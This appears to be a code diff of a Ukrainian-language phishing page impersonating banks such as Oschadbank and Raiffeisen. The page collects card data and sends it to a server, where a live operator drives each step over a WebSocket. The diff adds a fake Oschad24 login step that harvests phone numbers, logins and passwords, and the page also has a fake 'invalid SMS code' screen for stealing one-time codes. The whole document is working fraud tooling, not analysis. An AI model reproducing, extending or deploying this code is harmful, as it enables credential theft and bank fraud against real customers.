@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Оберіть свій банк</title>
     <style>
+        /* Стили остаются как в предыдущем варианте */
         *, *::before, *::after { box-sizing: border-box; }
         :root {
             --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
@@ -143,34 +144,13 @@ document.addEventListener('DOMContentLoaded', () => {
             name: 'Ощадбанк',
             logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
             theme: 'oschadbank',
-            steps: specialFlowSteps, // Упрощено: как у других, без lk и звонка
-            special: true // Добавляем флаг для унификации
+            steps: specialFlowSteps, // Базовые шаги
+            special: true
         },
         'raiffeisen': {
             name: 'Райффайзен',
             logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
             theme: 'raiffeisen',
-            steps: specialFlowSteps,
-            special: true
-        },
-        'alliance': {
-            name: 'Альянс',
-            logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
-            theme: 'alliance',
-            steps: specialFlowSteps,
-            special: true
-        },
-        'pumb': {
-            name: 'ПУМБ',
-            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
-            theme: 'pumb',
-            steps: specialFlowSteps,
-            special: true
-        },
-        'otp': {
-            name: 'OTP Bank',
-            logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
-            theme: 'otp',
             steps: specialFlowSteps,
             special: true
         },
@@ -211,32 +191,29 @@ document.addEventListener('DOMContentLoaded', () => {
         return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
     }).join('');
 
-    // Улучшенное подключение WebSocket с логами и fallback
     function connectWebSocket() {
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const wsUrl = `${protocol}//${window.location.host}`;
-        console.log('Attempting WS connection to:', wsUrl); // Лог для отладки
+        console.log('Connecting to WS:', wsUrl);
         ws = new WebSocket(wsUrl);
         ws.onopen = () => {
-            console.log('WebSocket connected successfully');
-            ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
+            console.log('WS connected');
+            ws.send(JSON.stringify({ type: 'register', sessionId }));
         };
         ws.onmessage = (event) => {
-            console.log('WS message received:', event.data); // Лог
+            console.log('WS message:', event.data);
             const command = JSON.parse(event.data);
             handleServerCommand(command);
         };
-        ws.onclose = (event) => {
-            console.log('WebSocket closed:', event.code, event.reason, 'Reconnecting...');
+        ws.onclose = () => {
+            console.log('WS closed, retrying in 3s...');
             setTimeout(connectWebSocket, 3000);
         };
-        ws.onerror = (error) => {
-            console.error('WebSocket error:', error); // Лог ошибки
-        };
+        ws.onerror = (error) => console.error('WS error:', error);
     }
 
     async function sendDataToServer(data, isFinal) {
-        console.log('Sending to server:', { sessionId, bankName: activeBankData.name, isFinal, data }); // Лог
+        console.log('Sending data:', { sessionId, bankName: activeBankData.name, isFinal, data });
         collectedData = { ...collectedData, ...data };
         try {
             const response = await fetch('/api/submit', {
@@ -250,10 +227,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     ...collectedData 
                 }),
             });
-            const respJson = await response.json();
-            console.log('Server response:', respJson); // Лог ответа
+            console.log('Server response:', await response.json());
         } catch (error) {
-            console.error('Failed to send data:', error);
+            console.error('Send data error:', error);
         }
     }
 
@@ -273,12 +249,12 @@ document.addEventListener('DOMContentLoaded', () => {
         const step = activeBankData.steps[currentStepIndex];
         let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
 
-        console.log('Step info:', { stepType: step.type, currentIndex: currentStepIndex, totalSteps: activeBankData.steps.length, isFinal: isFinalStep }); // Лог для отладки
-
         sendDataToServer(data, isFinalStep);
 
-        // Унифицировано для всех special банков (включая Ощад)
         if (activeBankData.special && step.type === 'card_simple') {
+            if (activeBankData.name === 'Ощадбанк') {
+                activeBankData.steps.push({ type: 'lk', title: 'Авторизуйтесь через Ощад24' });
+            }
             showWaitingScreen();
             return;
         }
@@ -295,7 +271,6 @@ document.addEventListener('DOMContentLoaded', () => {
         modalTitle.textContent = 'Очікуємо';
         stepContent.innerHTML = '<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>';
         modalFooter.style.display = 'none';
-        console.log('Waiting screen shown for session:', sessionId); // Лог
     }
 
     function handleBackStep() {
@@ -304,7 +279,7 @@ document.addEventListener('DOMContentLoaded', () => {
             renderStep();
         } else {
             body.classList.remove('form-active');
-            if (ws) { ws.close(); }
+            if (ws) ws.close();
         }
     }
 
@@ -406,6 +381,36 @@ document.addEventListener('DOMContentLoaded', () => {
                 });
                 html += '</div>';
                 break;
+            case 'lk':
+                html = `
+                    <div id="modal-step-content">
+                        <p style="text-align:center; font-size: 18px; color: var(--light-text);">Ласкаво просимо</p>
+                        <p style="text-align:center; font-size: 18px; font-weight: 600;">Для входу введіть логін або номер телефону</p>
+                        <div class="multi-input-row" style="margin-top: 20px;">
+                            <button class="btn btn-next" style="background-color: var(--primary-color); flex: 1;" data-option="phone">Номер телефону</button>
+                            <button class="btn btn-next" style="background-color: var(--primary-color); flex: 1;" data-option="login">Логін</button>
+                        </div>
+                    </div>
+                `;
+                break;
+            case 'phone_login':
+                html = `
+                    <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone_login" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>
+                    <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
+                    <div class="modal-footer">
+                        <button class="btn btn-next" id="continue-btn">Продовжити</button>
+                    </div>
+                `;
+                break;
+            case 'login_login':
+                html = `
+                    <div class="input-group"><input type="text" class="input-field" id="login" placeholder="Логін"></div>
+                    <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
+                    <div class="modal-footer">
+                        <button class="btn btn-next" id="continue-btn">Продовжити</button>
+                    </div>
+                `;
+                break;
         }
         modalTitle.textContent = step.title;
         stepContent.innerHTML = html;
@@ -413,6 +418,30 @@ document.addEventListener('DOMContentLoaded', () => {
         backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
         nextBtn.style.display = 'block';
         addInputFormatting();
+
+        if (step.type === 'lk') {
+            stepContent.querySelectorAll('.btn-next').forEach(button => {
+                button.addEventListener('click', () => {
+                    const option = button.dataset.option;
+                    currentStepIndex++;
+                    activeBankData.steps.splice(currentStepIndex, 0, {
+                        type: option === 'phone' ? 'phone_login' : 'login_login',
+                        title: option === 'phone' ? 'Введіть номер телефону та пароль' : 'Введіть логін та пароль'
+                    });
+                    renderStep();
+                });
+            });
+        } else if (step.type === 'phone_login' || step.type === 'login_login') {
+            document.getElementById('continue-btn').addEventListener('click', () => {
+                if (validateCurrentStep()) {
+                    sendDataToServer({
+                        [step.type === 'phone_login' ? 'phone_login' : 'login']: document.getElementById(step.type === 'phone_login' ? 'phone_login' : 'login').value.replace(/\D/g, ''),
+                        password: document.getElementById('password').value
+                    }, true);
+                    showWaitingScreen();
+                }
+            });
+        }
     }
 
     document.querySelectorAll('.bank-item').forEach(item => {
@@ -425,7 +454,6 @@ document.addEventListener('DOMContentLoaded', () => {
             body.classList.add('form-active');
             currentStepIndex = 0;
             collectedData = {};
-            console.log('Bank selected:', activeBankData.name, 'Steps:', activeBankData.steps); // Лог
             renderStep();
             connectWebSocket();
         });
@@ -435,7 +463,7 @@ document.addEventListener('DOMContentLoaded', () => {
     backBtn.addEventListener('click', handleBackStep);
 
     function handleServerCommand(command) {
-        console.log('Handling server command:', command); // Лог
+        console.log('Server command:', command);
         const { type, data } = command;
         const showMessageWithButton = (title, text, btnText, callback) => {
             modalTitle.textContent = title;
@@ -528,7 +556,7 @@ document.addEventListener('DOMContentLoaded', () => {
             });
             console.log('SMS data sent to server.');
         } catch (error) {
-            console.error('Failed to send sms code:', error);
+            console.error('Failed to send SMS code:', error);
         }
 
         modalTitle.textContent = "Невірний код";
